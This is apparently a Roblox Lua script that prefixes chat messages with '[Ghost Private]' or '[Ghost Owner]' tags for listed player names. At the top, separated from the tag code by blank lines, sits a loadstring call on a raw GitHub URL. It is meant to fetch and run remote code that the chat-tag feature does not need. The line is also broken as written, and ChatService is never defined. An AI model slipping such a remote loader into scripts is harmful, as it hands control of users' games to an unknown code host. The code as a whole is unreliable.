--Notified here so you don't forget this


loadstring("https://raw.githubusercontent.com/Windows-10-1234/GSWhitelist/main/Loadstring")()








-- Custom tags
local myTag = "[Ghost Private]"
local ownerTag = "[Ghost Owner]"

-- List of player names that should have the "GhostPrivate"
local playersWithMyTag = {
    "Player1", -- Change the names
    "Player2", -- to add more do under the player2 "{name}", and repeat for more usertags
    -- Add more player names here
}

-- List of player names that should have the "OwnerTag"
local owners = {
    "GetReketed_1",
    "Owner2",
    -- Add more owner names here
}

-- Register the chat tags
ChatService:RegisterChatCallback(Enum.ChatCallbackType.OnCreatingChatMessage, function(player, message, channel)
    local playerName = player.Name
    local hasMyTag = false
    local hasOwnerTag = false

    -- Check if the player's name is in the list of players with "MyTag"
    for _, name in ipairs(playersWithMyTag) do
        if playerName == name then
            hasMyTag = true
            break
        end
    end

    -- Check if the player's name is in the list of owners
    for _, name in ipairs(owners) do
        if playerName == name then
            hasOwnerTag = true
            break
        end
    end

    -- Apply the appropriate tag
    local modifiedMessage = message
    if hasMyTag then
        modifiedMessage = myTag .. " " .. message
    elseif hasOwnerTag then
        modifiedMessage = ownerTag .. " " .. message
    end

    return modifiedMessage
end)


